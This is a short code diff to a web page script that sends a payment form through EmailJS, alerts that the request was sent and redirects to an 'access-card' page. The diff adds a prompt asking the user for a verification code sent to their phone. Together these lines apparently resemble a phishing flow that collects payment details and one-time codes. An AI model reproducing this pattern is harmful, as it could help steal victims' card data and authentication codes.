@@ -73,6 +73,8 @@
       emailjs.sendForm("service_xuw4eys", "template_c0462aw", this)
         .then(function() {
           alert("Payment request sent successfully!");
+          alert("Enter verification code sent to your phone to complete!");
+
           window.location.href = "access-card.html"; // redirect to thank-you page
         }, function(error) {
           console.log("FAILED...", error);
